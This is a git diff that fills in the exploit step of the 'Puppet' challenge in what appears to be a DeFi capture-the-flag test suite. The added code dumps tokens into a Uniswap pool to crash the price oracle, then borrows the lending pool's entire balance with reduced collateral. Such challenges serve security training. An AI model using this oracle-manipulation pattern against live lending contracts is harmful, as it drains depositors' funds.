@@ -103,6 +103,18 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Swap lots of tokens to eth to lower DVT price
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        let deadline = (await ethers.provider.getBlock('latest')).timestamp
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+                ATTACKER_INITIAL_TOKEN_BALANCE.sub(10), // for the test case
+                1,                                     
+                deadline + 10
+        );
+
+        // calculate how much collateral is needed and borrow all the DVT tokens
+        const collateral = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: collateral })
     });
 
     after(async function () {
